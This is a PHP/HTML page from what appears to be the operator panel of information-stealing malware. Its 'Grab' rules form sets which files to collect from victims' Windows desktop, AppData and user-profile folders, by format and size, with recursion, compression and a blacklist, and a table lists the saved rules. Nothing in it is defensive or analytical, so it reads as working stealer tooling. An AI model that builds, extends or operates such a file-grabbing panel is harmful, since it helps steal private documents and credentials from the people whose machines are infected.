<?php
include("./header.php");



?>


<!-- Page Content-->
<div class="page-content">
    <div class="container">
        <!-- Page-Title -->
        <div class="row">
            <div class="col-sm-12">
                <div class="page-title-box">
                    <div class="row">
                        <div class="col">
                            <h4 class="page-title">Grab</h4>
                            <ol class="breadcrumb">
                                <li class="breadcrumb-item">Rules</li>

                            </ol>
                        </div>
                        <!--end col-->
                    </div>
                    <!--end row-->
                </div>
                <!--end page-title-box-->
            </div>
            <!--end col-->
        </div>
        <!--end row-->
        <!-- end page title end breadcrumb -->
        <div class="row">
            <div class="col-12">
                <div class="card">
                    <!--end card-header-->
                    <div class="card-body">
					<form enctype="multipart/form-data" action="includes/grabactions.php" method="POST" >
                        <div class="row mb-3">
							<div class="col-3">
                                <p class="mb-0 text-muted">
                                <div class="form-group">
                                    <label for="useremail">Name:</label>
                                    <input name="nameField" type="text" class="form-control" required="" placeholder="Name">
                                </div>
                                </p>
                            </div> <!-- end col -->

                            <div class="col-1">
                                <p class="mb-0 text-muted">
                                <div class="form-group">
                                    <label for="useremail">Max Size:</label>
                                    <input name="maxSizeField" type="number" class="form-control" value="0" placeholder="in KB">
                                </div>
                                </p>
                            </div> <!-- end col -->


							 <div class="col-3">
                                <p class="mb-0 text-muted">
                                <div class="form-group">
                                    <label for="useremail">Path:</label>
                                    <input name="pathField" data-toggle="tooltip" data-placement="top" title="Paths available&#013;
									%DESKTOP%\&#013;
									%APPDATA%\&#013;
									%LOCALAPPDATA%\&#013;
									%USERPROFILE%\" type="text" class="form-control" required="" placeholder="%DESKTOP%\">
                                </div>
                                </p>
                            </div>  
							
                            <div class="col-3">
                                <p class="mb-0 text-muted">
                                <div class="form-group">
                                    <label for="useremail">Formats:</label>
                                    <input name="formatsField" type="text" class="form-control" required="" placeholder="*.txt,*.doc,*.pdf">
                                </div>
                                </p>
                            </div> <!-- end col -->       
                            
							<div class="col-2">
                                <p class="mb-0 text-muted">
                                <div class="form-group">
                                    <label for="useremail">Blacklist:</label>
                                    <input name="blacklistField" type="text" class="form-control"  placeholder="example.txt,example.pdf">
                                </div>
                                </p>
                            </div>
							
							<div class="col-lg-3 d-flex align-items-center">
                                <div class="custom-control custom-switch switch-primary">
                                    <input name="recursivelyCheck" type="checkbox" class="custom-control-input" id="emptyCheckbox" data-parsley-multiple="groups" data-parsley-mincheck="2">
                                    <label class="custom-control-label" for="emptyCheckbox">Collect recursively</label>
                                </div>
                            </div>
						   
							<div class="col-lg-3 d-flex align-items-center">
                                <div class="custom-control custom-switch switch-primary">
                                    <input name="compressCheck" type="checkbox" checked class="custom-control-input" id="compressCheckbox" data-parsley-multiple="groups" data-parsley-mincheck="2">
                                    <label class="custom-control-label" for="compressCheckbox">Compress</label>
                                </div>
                            </div>
							
							<div class="col-lg-4"></div>
                            
                            <div class="col-lg-2 text-right">

                                        <button type="submit" class="btn-addRules btn btn-md btn-outline-success">Add rule</button>
                                 
                            </div>
						
                        </div>
						</form>
                        <table class="table  dt-responsive nowrap" style="border-collapse: collapse; border-spacing: 0; width: 100%;">
                            <thead>
                                <tr>
                                    <th style="width: 180px;">Name</th>
                                    <th>Max Size</th>
                                    <th>Path</th>
                                    <th style="width: 200px;">Formats</th>
									<th style="width: 200px;">Blacklist</th>
                                    <th style="width: 40px;">Recursively</th>
									<th style="width: 40px;">Compress</th>
                                    <th style="width: 120px;" class="text-center">Actions</th>
                                    <th style="width: 80px;">Is active</th>
                                </tr>
                            </thead>


                            <tbody id="rows">
                                <?php
									require_once 'includes/grabload.php';
									grabload();
								?>
                            </tbody>
                        </table>

                    </div>
                </div>

            </div> <!-- end col -->
        </div> <!-- end row -->

    </div><!-- container -->

    <?php
include("./footer.php");



?>
    <!--end footer-->
</div>
<!-- end page content -->
</div>
<!-- end page-wrapper -->




<!-- jQuery  -->
<script src="assets/js/jquery.min.js"></script>
<script src="assets/js/bootstrap.bundle.min.js"></script>
<script src="assets/js/metismenu.min.js"></script>
<script src="assets/js/waves.js"></script>
<script src="assets/js/feather.min.js"></script>
<script src="assets/js/simplebar.min.js"></script>
<script src="assets/js/moment.js"></script>

<!-- Plugins js -->
<script src="assets/js/select2.min.js"></script>

<script src="assets/js/jquery.forms-advanced.js"></script>

<!-- App js -->
<script src="assets/js/app.js"></script>

<!-- Page js -->
<script src="includes/grabactions.js"></script>

</body>

</html>